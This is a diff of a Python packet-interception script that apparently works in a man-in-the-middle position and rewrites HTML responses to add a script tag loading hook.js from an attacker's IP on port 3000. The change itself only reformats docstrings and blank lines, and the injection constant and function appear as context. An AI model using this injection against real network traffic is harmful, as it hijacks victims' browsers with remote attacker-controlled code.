@@ -14,10 +14,11 @@ SCRIPT_TAG = '<script src="http://'+IP_ADDRESS+':3000/hook.js"></script>'
 LINE = '____________________________________________________________'
 
 
-'''
-Process each packet
-'''
 def process_packet(packet):
+    '''
+    Process each packet
+    '''
+
     #Evaluate IP packet filtered
     IP_pkt = IP(packet.get_payload())
     
@@ -65,11 +66,11 @@ def process_packet(packet):
     
     packet.accept()
 
-
-'''
-Injection code
-'''
 def injection_code(load):
+    '''
+    Injection code
+    '''
+
     global END_TAG, SCRIPT_TAG
 
     #If the HTML page has TAG, I'm going to replace it with javascript code
@@ -88,10 +89,11 @@ def injection_code(load):
     return load
 
 
-'''
-Parser of command line argument
-'''
 def args_parser():
+    '''
+    Parser of command line argument
+    '''
+
     global SCRIPT_TAG
 
     #Parser of command line arguments
@@ -105,10 +107,6 @@ def args_parser():
     
     return args.local
 
-
-'''
-Main function
-'''
 def main():
     #Parser of command line arguments
     local = args_parser()
@@ -136,7 +134,6 @@ def main():
         print('Flushing ip table.', end='\n')
         cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
         os.system('iptables -F')
-
 
 if __name__=='__main__':
 	main()
